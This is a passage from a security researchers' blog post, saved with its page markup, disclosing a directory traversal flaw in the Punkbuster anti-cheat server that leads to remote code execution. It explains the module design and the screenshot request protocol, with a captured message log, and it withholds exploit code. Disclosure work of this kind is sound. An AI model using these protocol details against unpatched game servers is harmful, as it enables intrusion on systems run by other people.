href="/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" rel="noopener follow" href="/search?source=---top_nav_layout_nav----------------------------------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="57ca" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">Hacking Punkbuster</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/@prizmant?source=post_page---byline--e22e6cf2f36e--------------------------------"><div class="l ib ic by id ie"><div class="l fj"><img alt="Daniel Prizmant" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/0*A_LwwCYAwlc0mu4V.jpg" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="ih ab q"><div class="ab q ii"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b ij ik bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" data-testid="authorName" rel="noopener follow" href="/@prizmant?source=post_page---byline--e22e6cf2f36e--------------------------------">Daniel Prizmant</a></p></div></div></div><span class="im in" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b ij ik du"><span><a class="io ip ah ai aj ak al am an ao ap aq ar ex iq ir" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F6accd23011ad&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;user=Daniel+Prizmant&amp;userId=6accd23011ad&amp;source=post_page-6accd23011ad--byline--e22e6cf2f36e---------------------post_header-----------">Follow</a></span></p></div></div></span></div></div><div class="l is"><span class="bf b bg z du"><div class="ab cn it iu iv"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">10 min read</span><div class="iw ix l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Sep 25, 2020</span></div></span></div></span></div></div></div><div class="ab cp iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn"><div class="h k w fg fh q"><div class="kd l"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fe22e6cf2f36e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;user=Daniel+Prizmant&amp;userId=6accd23011ad&amp;source=---header_actions--e22e6cf2f36e---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q jo jp jq jr js jt ju jv jw jx jy jz ka kb kc"><div class="lf k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fe22e6cf2f36e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40prizmant%2Fhacking-punkbuster-e22e6cf2f36e&amp;source=---header_actions--e22e6cf2f36e---------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lh cn"><div class="l ae"><div class="ab cb"><div class="li lj lk ll lm ln ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr ls lt lu lv s lw lx ly lz ma mb mc u md me mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr ls lt lu lv s lw lx ly lz ma mb mc u md me mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><h1 id="b65c" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">A Directory Traversal Attack on Punkbuster Server can be Leveraged to Gain Remote Code Execution (CVE-2020–24102, CVE-2020–26037)</h1><figure class="nh ni nj nk nl nm ne nf paragraph-image"><div role="button" tabindex="0" class="nn no fj np bh nq"><div class="ne nf ng"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9CiLrQCxtufYQW0TU8O4aA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*9CiLrQCxtufYQW0TU8O4aA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*9CiLrQCxtufYQW0TU8O4aA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*9CiLrQCxtufYQW0TU8O4aA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*9CiLrQCxtufYQW0TU8O4aA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*9CiLrQCxtufYQW0TU8O4aA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9CiLrQCxtufYQW0TU8O4aA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*9CiLrQCxtufYQW0TU8O4aA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*9CiLrQCxtufYQW0TU8O4aA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*9CiLrQCxtufYQW0TU8O4aA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*9CiLrQCxtufYQW0TU8O4aA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*9CiLrQCxtufYQW0TU8O4aA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*9CiLrQCxtufYQW0TU8O4aA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*9CiLrQCxtufYQW0TU8O4aA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln nr c" width="700" height="261" loading="eager" role="presentation"/></picture></div></div></figure><h1 id="fd9d" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">Who We Are</h1><p id="8d95" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">We are two gamers that love the <em class="oq">Battlefield</em> series and also happened to like reverse engineering projects.</p><p id="d744" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Daniel Prizmant — A senior security researcher at Palo Alto Networks who loves video games reverse engineering— <a class="af ow" href="https://www.linkedin.com/in/prizmant/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/prizmant/</a> — <a class="af ow" href="https://twitter.com/prizdan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/prizdan</a></p><p id="151c" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Mauricio Sandt — Second semester CS student doing low level programming and reverse engineering as a hobby — <a class="af ow" href="https://www.linkedin.com/in/mauriciosandt/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/mauriciosandt/</a></p><h1 id="af14" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">Some Background</h1><p id="65f1" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">Back in the day, before kernel-driver-backed anti cheats, Punkbuster was the gold standard in the industry. Punkbuster was revolutionary and introduced many new techniques to fight cheaters. It was a very long time ago, but back then all the big titles, like <em class="oq">Battlefield 2</em> and <em class="oq">Call of Duty: Modern Warfare</em> were using Punkbuster as their go-to anti cheat. Sadly, Punkbuster didn’t manage to keep up with the industry and it has been years since a <strong class="nu gv">new</strong> online game chose to use its services (the last game to use it was <em class="oq">Battlefield Hardline</em> released in March 2015).</p><h1 id="d731" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">How did We Get Here?</h1><p id="e71d" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">Recently we started playing <em class="oq">Battlefield 4</em> again, and were surprised to find out there are still many active servers, almost 1000 servers in total with 50,000 unique daily players, and most of them are Punkbuster protected.</p><p id="7d4a" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">We thought it would be a cool side project to take a look at the internals of Punkbuster and fundamentally understand how it works, so we did.</p><p id="f95f" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">For security reasons we will only give a high level description of the vulnerability and won’t dive deep into the actual reverse engineering process.</p><p id="2211" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">We won’t share a working exploit either as there are still some servers that didn’t update yet.</p><h1 id="f9ae" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">Client Server Architecture</h1><p id="1117" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">Both client and server side of Punkbuster work as modules. Both load the main Punkbuster module which just exports two functions:</p><ul class=""><li id="d5b8" class="ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op ox oy oz bk"><code class="cx pa pb pc pd b">ca</code> and <code class="cx pa pb pc pd b">cb</code> for the client</li><li id="3d83" class="ns nt gu nu b nv pe nx ny nz pf ob oc od pg of og oh ph oj ok ol pi on oo op ox oy oz bk"><code class="cx pa pb pc pd b">sa</code> and <code class="cx pa pb pc pd b">sb</code> for the server</li></ul><p id="f60f" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Those two functions handle all the Punkbuster events for both sides. Event messages are encoded and decoded twice, once by Punkbuster itself (not dependent on the game) and once by the game itself.</p><p id="e7ec" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">For example, when a Punkbuster client sends a new message to the server it encodes it, then passes it to the game client which encodes it too as part of the game encoding. Eventually the message is received at the game server which decodes it and passes it to the Punkbuster module which decodes it using the Punkbuster algorithm.</p><figure class="nh ni nj nk nl nm ne nf paragraph-image"><div role="button" tabindex="0" class="nn no fj np bh nq"><div class="ne nf pj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*Bohhdw9dmZKA4Cjc 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*Bohhdw9dmZKA4Cjc 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*Bohhdw9dmZKA4Cjc 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*Bohhdw9dmZKA4Cjc 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*Bohhdw9dmZKA4Cjc 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*Bohhdw9dmZKA4Cjc 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Bohhdw9dmZKA4Cjc 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*Bohhdw9dmZKA4Cjc 640w, https://miro.medium.com/v2/resize:fit:720/0*Bohhdw9dmZKA4Cjc 720w, https://miro.medium.com/v2/resize:fit:750/0*Bohhdw9dmZKA4Cjc 750w, https://miro.medium.com/v2/resize:fit:786/0*Bohhdw9dmZKA4Cjc 786w, https://miro.medium.com/v2/resize:fit:828/0*Bohhdw9dmZKA4Cjc 828w, https://miro.medium.com/v2/resize:fit:1100/0*Bohhdw9dmZKA4Cjc 1100w, https://miro.medium.com/v2/resize:fit:1400/0*Bohhdw9dmZKA4Cjc 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln nr c" width="700" height="198" loading="lazy" role="presentation"/></picture></div></div></figure><p id="23ee" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">This means that using tools like Wireshark to tap the communication won’t get you far as all the Punkbuster communication is encoded twice. Note that RCON commands are not encoded and received in the server as plain text.</p><h1 id="f449" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">The Screenshots Mechanism</h1><p id="3801" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">One of Punkbuster’s features is the capability of requesting a screenshot from the game clients. The official description of the feature is the following:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="8249" class="po mh gu pd b ij pp pq l pr ps">The PunkBuster Screen Capture Facility allows Server Admins to request actual screenshots from players’ screens while they are playing. The screenshots are transferred over the network and saved by the Server Admins either for private use or possibly for publication to a website.</span></pre><p id="0142" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">So, basically, admins can ask clients to send their screenshots to the server for observation. This can also be scheduled so each client will be requested a screenshot each <code class="cx pa pb pc pd b">x</code> amount of seconds.</p><h1 id="fcc6" class="mg mh gu bf mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bk">Screenshot Hello World</h1><p id="1938" class="pw-post-body-paragraph ns nt gu nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op gn bk">Without getting into too much details about the protocol, suffice to say that when an admin wants to get a screenshot from a client, either manually or because <code class="cx pa pb pc pd b">x</code> amount of seconds passed since the last screenshot, it sends the client a message in a format we will explain later in the post.</p><p id="7f0c" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Consider the following log which was captured on the internals of the server side of <em class="oq">Battlefield 4</em> (after the 2 decoding processes) for this research:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="3583" class="po mh gu pd b ij pp pq l pr ps">Msg FROM slot #-1<br/>00000000 | 70 62 5f 73 76 5f 67 65 | pb_sv_ge<br/>00000008 | 74 73 73 20 31          | tss 1</span><span id="e954" class="po mh gu pd b ij pt pq l pr ps">Msg TO   slot #0<br/>00000000 | 49 30 20 31 32 39 34 36 | I0 12946<br/>00000008 | 38 39 37 35 34 20 31 20 | 89754 1<br/>00000010 | 33 32 30 20 32 34 30 20 | 320 240<br/>00000018 | 35 30 20 35 30 20 31 00 | 50 50 1.</span><span id="70da" class="po mh gu pd b ij pt pq l pr ps">Msg FROM slot #0<br/>00000000 | 47 31 34 34 33 38 30 20 | G144380<br/>00000008 | 43 31 44 36 36 39 39 41 | C1D6699A<br/>00000010 | 45 34 42 31 45 42 34 31 | E4B1EB41<br/>00000018 | 37 38 43 35 45 36 46 35 | 78C5E6F5<br/>00000020 | 45 41 42 38 30 46 35 39 | EAB80F59<br/>00000028 | 20 41 70 62 30 30 30 30 |  Apb0000<br/>00000030 | 30 31 2e 70 6e 67 00    | 01.png.</span><span id="6667" class="po mh gu pd b ij pt pq l pr ps">Msg FROM slot #0<br/>00000000 | 48 00 00 41 89 50 4e 47 | H..A.PNG<br/>00000008 | 0d 0a 1a 0a 00 00 00 0d | ........<br/>00000010 | 49 48 44 52 00 00 02 2e | IHDR....<br/>00000018 | 00 00 01 32 08 02 00 00 | ...2....<br/>00000020 | 00 52 d4 cc f5 00 00 00 | .R......<br/>00000028 | e6 74 45 58 74 63 6f 6d | .tEXtcom<br/>00000030 | 6d 65 6e 74 00 50 75 6e | ment.Pun<br/>00000038 | 6b 42 75 73 74 65 72 20 | kBuster<br/>00000040 | 53 63 72 65 65 6e 73 68 | Screensh<br/>00000048 | 6f 74 20 28 f1 29 20 42 | ot (.) B<br/>00000050 | 46 34 20 20 4c 65 76 65 | F4  Leve<br/>00000058 | 6c 73 2f 4d 50 2f 4d 50 | ls/MP/MP<br/>00000060 | 5f 41 62 61 6e 64 6f 6e | _Abandon<br/>00000068 | 65 64 2f 4d 50 5f 41 62 | ed/MP_Ab<br/>00000070 | 61 6e 64 6f 6e 65 64 0a | andoned.<br/>...<br/>...<br/>...</span></pre><p id="41f5" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Lets go over this line by line. First the server received, from slot <code class="cx pa pb pc pd b">#-1</code> (RCON admin) a request to take a screenshot from client on slot <code class="cx pa pb pc pd b">1</code>:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="5836" class="po mh gu pd b ij pp pq l pr ps">pb_sv_getss 1</span></pre><p id="4c9f" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">The server then sends the following message to slot <code class="cx pa pb pc pd b">1</code>:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="1f90" class="po mh gu pd b ij pp pq l pr ps">I0 1294689754 1 320 240 50 50 1</span></pre><p id="c327" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">This is the screenshot message. The format of that message is the following:</p><pre class="nh ni nj nk nl pk pd pl pm ay pn bk"><span id="14dc" class="po mh gu pd b ij pp pq l pr ps">I[delay] [rand] [file_id] [width] [height] [x] [y] [rate]</span><span id="144b" class="po mh gu pd b ij pt pq l pr ps">[delay] = Maximum delay client waits before capturing screenshot<br/>[rand] = Random identifier, basically the ID of the screenshot<br/>[file_id] = The file name of the screenshot by the format pb%06.png<br/>[width] = The requested width, in pixels, of the screenshot<br/>[height] = The requested height, in pixels, of the screenshot<br/>[x] = The horizontal center of the screenshot, in %<br/>[y] = The vertical center of the screenshot, in %<br/>[rate] = The rate the server will receive the screenshot in kb/s</span></pre><p id="c6e6" class="pw-post-body-paragraph ns nt gu nu b nv or nx ny nz os ob oc od ot of og oh ou oj ok ol ov on oo op gn bk">Most of those variables can be configured with the following punkbuster server 